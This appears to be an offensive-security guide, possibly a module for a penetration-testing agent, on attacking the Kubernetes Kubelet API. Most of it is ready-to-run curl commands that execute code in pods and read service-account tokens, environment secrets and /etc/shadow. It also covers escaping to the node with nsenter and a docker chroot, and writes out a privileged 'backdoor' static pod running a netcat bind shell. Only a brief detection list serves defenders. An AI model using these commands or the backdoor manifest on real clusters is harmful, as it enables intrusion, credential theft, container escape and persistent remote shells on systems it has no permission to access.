<vulnerability_guide>
  <title>KUBELET API ABUSE</title>

  <critical>The Kubelet runs on every Kubernetes node and exposes an API for pod management. Misconfigured Kubelets allow unauthenticated access to execute commands in pods, read secrets, and potentially escape to the node. Kubelet compromise from one pod can lead to lateral movement across all pods on that node.</critical>

  <scope>
    - Kubelet API authentication bypass
    - Command execution in pods
    - Secret and log access
    - Pod creation and manipulation
    - Node resource access
    - Container runtime exploitation
  </scope>

  <methodology>
    1. KUBELET DISCOVERY
       {% raw %}
       # Default Kubelet ports
       10250 - Kubelet API (HTTPS)
       10255 - Read-only API (HTTP, deprecated)
       10248 - Health check

       # Find Kubelet from pod
       # Usually at node IP on 10250
       env | grep KUBERNETES
       cat /etc/hosts  # Node IP sometimes here

       # Check Kubelet connectivity
       curl -k https://NODE_IP:10250/pods

       # Read-only port (if enabled)
       curl http://NODE_IP:10255/pods
       curl http://NODE_IP:10255/spec
       {% endraw %}

    2. AUTHENTICATION TESTING
       {% raw %}
       # Anonymous auth check
       curl -k https://NODE_IP:10250/pods
       # If returns pod list = anonymous auth enabled

       # Service account token auth
       TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
       curl -k -H "Authorization: Bearer $TOKEN" https://NODE_IP:10250/pods

       # Client certificate auth
       # Kubelet may trust cluster CA
       curl --cacert ca.crt --cert client.crt --key client.key \
         https://NODE_IP:10250/pods

       # Node authorization mode
       # If --authorization-mode=AlwaysAllow = no auth required
       {% endraw %}

    3. POD COMMAND EXECUTION
       {% raw %}
       # Execute command in pod via Kubelet
       curl -k -X POST \
         "https://NODE_IP:10250/run/{namespace}/{pod}/{container}" \
         -d "cmd=id"

       # Or using exec endpoint
       curl -k -X POST \
         "https://NODE_IP:10250/exec/{namespace}/{pod}/{container}?command=id&input=1&output=1&tty=1"

       # Get shell
       curl -k -X POST \
         "https://NODE_IP:10250/run/default/nginx-pod/nginx" \
         -d "cmd=cat /etc/passwd"

       # Access all pods on the node
       # First list pods
       curl -k https://NODE_IP:10250/pods | jq '.items[].metadata.name'
       {% endraw %}

    4. SECRET ACCESS
       {% raw %}
       # Read pod environment (includes secrets)
       curl -k -X POST \
         "https://NODE_IP:10250/run/default/app-pod/app" \
         -d "cmd=env"

       # Read mounted secrets
       curl -k -X POST \
         "https://NODE_IP:10250/run/default/app-pod/app" \
         -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

       # Read configmaps
       curl -k -X POST \
         "https://NODE_IP:10250/run/default/app-pod/app" \
         -d "cmd=cat /etc/config/app.conf"

       # All secrets on node
       # Iterate through all pods
       {% endraw %}

    5. LOG ACCESS
       {% raw %}
       # Read container logs
       curl -k https://NODE_IP:10250/containerLogs/{namespace}/{pod}/{container}

       # Example
       curl -k https://NODE_IP:10250/containerLogs/default/nginx/nginx

       # Logs may contain:
       # - Credentials
       # - API keys
       # - Internal URLs
       # - Debug information
       {% endraw %}
  </methodology>

  <advanced_techniques>
    <container_escape>
      {% raw %}
      # From Kubelet access, escalate to node

      # Find privileged container
      curl -k https://NODE_IP:10250/pods | \
        jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'

      # Exec into privileged container
      curl -k -X POST \
        "https://NODE_IP:10250/run/kube-system/privileged-pod/container" \
        -d "cmd=nsenter -t 1 -m -u -n -i bash"

      # Access host filesystem
      curl -k -X POST \
        "https://NODE_IP:10250/run/default/hostpath-pod/app" \
        -d "cmd=cat /host/etc/shadow"
      {% endraw %}
    </container_escape>

    <cri_socket_access>
      {% raw %}
      # Container Runtime Interface socket

      # If mounted or accessible
      # Docker socket: /var/run/docker.sock
      # containerd socket: /var/run/containerd/containerd.sock
      # CRI-O socket: /var/run/crio/crio.sock

      # Via privileged container
      curl -k -X POST \
        "https://NODE_IP:10250/run/default/priv-pod/app" \
        -d "cmd=docker ps"

      # Create escaping container
      docker run -v /:/host -it alpine chroot /host
      {% endraw %}
    </cri_socket_access>

    <metrics_exploitation>
      {% raw %}
      # Kubelet metrics contain sensitive info

      # Metrics endpoints
      curl -k https://NODE_IP:10250/metrics
      curl -k https://NODE_IP:10250/metrics/resource
      curl -k https://NODE_IP:10250/metrics/probes
      curl -k https://NODE_IP:10250/metrics/cadvisor

      # Information revealed:
      # - All pods on node
      # - Resource usage patterns
      # - Container configurations
      # - Network connections
      {% endraw %}
    </metrics_exploitation>

    <static_pod_manipulation>
      {% raw %}
      # Static pods defined on node filesystem

      # Default location
      /etc/kubernetes/manifests/

      # If you can write to node filesystem:
      # Add malicious static pod
      cat > /etc/kubernetes/manifests/backdoor.yaml << EOF
      apiVersion: v1
      kind: Pod
      metadata:
        name: backdoor
      spec:
        hostNetwork: true
        hostPID: true
        containers:
        - name: shell
          image: alpine
          securityContext:
            privileged: true
          command: ["/bin/sh", "-c", "while true; do nc -l -p 4444 -e /bin/sh; done"]
      EOF

      # Kubelet will automatically create the pod
      {% endraw %}
    </static_pod_manipulation>

    <debug_handlers>
      {% raw %}
      # Kubelet debug endpoints

      # pprof endpoints (may be enabled)
      curl -k https://NODE_IP:10250/debug/pprof/
      curl -k https://NODE_IP:10250/debug/flags/

      # Spec endpoint
      curl -k https://NODE_IP:10250/spec/

      # ConfigZ (kubelet config)
      curl -k https://NODE_IP:10250/configz
      # May reveal security settings
      {% endraw %}
    </debug_handlers>
  </advanced_techniques>

  <detection>
    - Monitor Kubelet API access logs
    - Alert on unauthenticated connections
    - Track /run and /exec endpoint usage
    - Monitor for new static pod files
    - Check Kubelet --anonymous-auth setting
  </detection>

  <validation>
    - Successfully access Kubelet API
    - Execute commands in pods on node
    - Extract secrets from pods
    - Access container logs
    - Demonstrate lateral movement capability
  </validation>

  <pro_tips>
    - Default Kubelet allows token auth - try pod's service account token
    - Read-only port 10255 often enabled for monitoring (great for recon)
    - kube-system namespace pods often have elevated privileges
    - etcd pods expose etcd certificates in environment
    - Static pod manifests persist even if kubectl deleted pod
    - Check for --anonymous-auth=true in Kubelet args
  </pro_tips>

  <remember>The Kubelet is your gateway to every pod on a node. With anonymous auth (common misconfiguration), you can execute commands in any pod, read any secret mounted in those pods, and potentially escape to the node. From inside a pod, the Kubelet on the host node (often 10250 on the node IP) is your first escalation target.</remember>
</vulnerability_guide>
